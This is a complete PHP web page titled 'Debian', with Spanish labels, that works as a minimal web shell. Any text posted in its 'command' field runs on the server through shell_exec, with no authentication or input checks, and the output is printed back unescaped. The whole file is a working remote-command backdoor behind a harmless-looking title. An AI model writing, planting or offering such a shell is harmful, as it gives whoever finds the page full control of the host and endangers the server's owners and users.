<!DOCTYPE html>
<html>

<head>
    <title>Debian</title>
</head>

<body>
    <?php
    $command = "";

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST["command"];
        $output = shell_exec($command);
    }
    ?>

    <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
        <input type="text" name="command" placeholder="Escribe tu comando">
        <button type="submit">Ejecutar</button>
    </form>

    <div>
        <?php echo $output; ?>
    </div>
</body>

</html>